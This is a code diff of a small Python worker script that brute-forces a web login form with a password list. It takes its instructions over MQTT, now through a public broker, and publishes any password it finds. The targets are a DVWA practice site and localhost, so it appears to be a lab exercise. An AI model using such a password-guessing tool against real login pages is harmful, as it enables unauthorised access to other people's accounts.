@@ -1,18 +1,17 @@
-from twill.commands import *
 import paho.mqtt.client as mqtt
+import mechanize
+
+br = mechanize.Browser()
 
 
 def crackPassword():
-    go(uri)
-
+    br.open(uri)
     for i in range(len(passs)):
-        fv('1', 'username', 'admin')
-        fv('1', 'password', passs[i])
-        submit()
-
-        if (go(uri) == uri):
-            print('password found', passs[i])
-            return 'found : ' + passs[i]
+        br.select_form(name='from')
+        br['pass'] = passs[i]
+        responsee = br.submit()
+        if ('succes' in responsee.geturl()):
+            return(passs[i] + ' current URL : ' + responsee.geturl())
 
 
 def on_message(client, userdata, message):
@@ -23,10 +22,10 @@ def on_message(client, userdata, message):
 global msg
 msg = ''
 
-passs = ['bababuwi', 'bababuwi', 'password',
+passs = ['bababuwi', 'bababuwi', 'bababuwi',
          'bababuwi', 'bababuwi', 'bababuwi']
 
-addr, port, uri = 'localhost', 9000, 'http://dvwa.l/'
+addr, port, uri = 'broker.emqx.io', 1883, 'http://localhost'
 
 client = mqtt.Client('Worker')
 client.on_message = on_message
@@ -43,10 +42,12 @@ while True:
         except:
             client.publish('topic/worker/result', 'Failed')
             break
-        if ('found' in result):
+        if ('succes' in result):
             client.publish('topic/worker/result',
                            'Success, password is ' + result)
             break
         else:
+            print(result)
             client.publish('topic/worker/result',
                            'Failed, Password not found in worker')
+            break
